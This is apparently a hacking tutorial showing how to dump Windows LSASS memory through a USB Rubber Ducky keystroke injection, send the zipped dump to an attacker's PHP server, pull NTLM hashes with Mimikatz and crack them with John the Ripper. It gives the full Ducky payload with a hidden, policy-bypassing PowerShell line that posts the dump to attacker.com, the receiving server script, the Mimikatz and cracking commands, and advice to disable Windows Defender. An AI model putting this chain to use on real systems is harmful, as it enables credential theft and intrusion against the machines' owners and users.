LSASS is responsible for authoritative domain authentication, active directory management, and enforcing security policies. It generates the processes accountable for authenticating users with NTLM as well as verifies the validity of logins. Because it's so crucial to the functionality of the operating system, hackers will often rename malicious executables after the process.


Mimikatz, is used to extract password hashes, Kerberos tickets, and PIN codes from Windows 10's memory. Since its creation, it has made headlines worldwide and become notorious for its ability to extract sensitive credentials from a running Windows computer.

Today, Windows Defender and antivirus software have become increasingly effective at detecting Mimikatz executions. Below is the VirusTotal detecton rates for a recent version of Mimikatz.

In combination with Mimikatz, hackers now use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), a standalone executable designed for administrators to monitor application crash dumps.

ProcDump is used to extract the LSASS dump, which is later moved to an offline Windows 10 computer and analyzed with Mimikatz. This is still an effective technique for extracting credentials from Windows 10, as ProcDump is a signed Microsoft binary and does not get flagged by antivirus software (shown below).

<img src="img/Dump-NTLM-Hashes-Crack-Windows-Passwords01.jpg" width="1080"> 

It's also possible to use the Windows 10 Task Manager to dump LSASS memory. Below is an example [keystroke injection](/0x03) attack designed to extract and exfiltrate the LSASS dump with PowerShell. The attack is completed in seconds (but slowed down at certain points for interpretation).

<img src="img/Dump-NTLM-Hashes-Crack-Windows-Passwords02.gif" width="1080"> 

The Task Manager is opened in the `Run` window with administrative privileges. The screen turns entirely dark for a second due to the User Access Control (UAC) prompt, which prevents the GIF creator from recording the screen. Then, the Local Security Authority Process (lsass.exe) is located in the list of processes and dumped into the %TEMP% directory (by default). A PowerShell one-liner is then executed entirely from the run window. It compresses the LSASS dump into a ZIP file and sends it to the attacker's server.


Comments (`REM`) have been added to each line in the payload for clarity.

```bat
REM 2.5 second delay to give Windows 10 some time to properly
REM mount the USB Rubber Ducky. This initial delay isn't
REM required with Mousejack attacks.

REM PowerShell one-liner to compress and exfiltrate the LSASS
REM dump file. Each part of the one-liner is explained in greater
REM detail below.
STRING powershell -ep bypass /w 1 /C $t=$env:temp;$l='lsass.DMP';compress-archive -path $t\$l -destinationpath $t\a.zip;iwr attacker.com/i.php -method POST -infile $t\a.zip

REM Press Enter to execute the PowerShell one-liner.
ENTER
```

The PowerShell payload consists of several commands chained together by semicolons:

- `powershell -ep bypass /w 1 /C` — The ExecutionPolicy (-ep) is set to "bypass" to allow PowerShell execution through Windows Defender and some antivirus software. The WindowStyle (/w) is set to "1," which immediately hides the PowerShell pop-up terminal.
- `$t=$env:temp;` — The target's temp directory is set to the variable $t. The single-letter variable usage helps shorten the overall length of the payload; It's more effective than typing "C:\Users\%USERNAME%\AppData\Local\Temp" over and over again.
- `$l='lsass.DMP';` — The lsass.DMP filename is set to the variable $l. This filename is defined by the Task Manager automatically.
- `compress-archive -path $t\$l -destinationpath $t\a.zip;` — PowerShell's Compress-Archive cmdlet is used to zip the lsass.DMP (-path) into the "a.zip" (-destinationpath) file.
- `iwr attacker.com/i.php -method POST -infile $t\a.zip` — Invoke-Webrequest (iwr) sends the a.zip (-infile) to the attacker's server in the form of a POST request. Be sure to change "attacker.com" to Kali's local IP address or VPS address.

Before performing any keystroke injections, a PHP server is needed to intercept the exfiltrated dump. The keystroke injection payload is expecting a server on port 80. 

Create a directory called `phpServer/` and change into it. Create a file called `i.php`.

```bash
$ mkdir phpServer/; cd phpServer/; nano i.php
```

Paste the below PHP script into the terminal, save and exit. 

```php
<?php
  $file = date("Hism") . ".zip";
  file_put_contents($file, file_get_contents("php://input"));
?>
```

This simple PHP script is capable of intercepting ZIP files and doesn't need to be modified in any way to function. When the target Windows 10 computer sends a zip, the server will save the data with the time as the filename.

Start the PHP server with the `php -S 0.0.0.0:80` command.

```bash
$ php -S 0.0.0.0:80

PHP 7.3.0-2 Development Server started
Listening on http://0.0.0.0:80
Document root is /root/phpServer
Press Ctrl-C to quit.
```


Move the intercepted ZIP file to a Windows 10 computer. Unzip it to find the" lsass.DMP" file. Make sure to [disable Windows Defender](img/Dump-NTLM-Hashes-Crack-Windows-Passwords03.jpg) and other security features before downloading Mimikatz. Alternatively, a [VM that doesn't have Windows Defender installed](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-break-into-somebodys-computer-without-password-exploiting-system-0183743/#jump-step4) can be configured for Mimikatz antics.

After unzipping the [Mimikatz ZIP](https://github.com/gentilkiwi/mimikatz/releases), open a PowerShell terminal. Use the following command to execute the `mimikatz.exe`.

```cmd
C:\> PS & "C:\Users\$env:username\PATH\TO\MIMIKATZ\x64\mimikatz.exe"

The below `sekurlsa::minidump` command will load the lsass.DMP into Mimikatz.

```
mimikatz # sekurlsa::minidump C:\Users\%USERNAME%\Documents\lsass.DMP

Switch to MINIDUMP : 'C:\Users\tokyoneon\Documents\lsass.DMP'

Use the `sekurlsa::logonPasswords` command to extract hashed credentials. Since Windows 8, plaintext passwords are no longer stored in memory without further modifying the operating system. On line 12, find the hashed password in NTLM format.

[Most passwords](tags/#password%20analysis) are between six and eight characters, usually consisting of six letters and ending in two digits.

After installing John the Ripper on a Raspberry Pi 3B+, the password ("nchfyr56") was guessed in just over five hours. Considering most passwords are eight characters long, mask attacks with a Raspberry Pi are surprisingly practical for brute-forcing NTLM hashes.

```
$ john -mask=?l?l?l?l?l?l?d?d --format=NT /root/Desktop/hash

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 32/32])

The very same hash took only **three minutes** to crack with an old Intel i7 but was estimated to take fifteen minutes to complete the entire keyspace.

NTLM hashes of even greater integrity (eight characters + four digits) were estimated to take about two days to crack. For hackers with dedicated brute-force machines, two days is very much within the realm of realistic. With a cluster of superior GPUs, hashes derived from a wider keyspace are easily cracked.
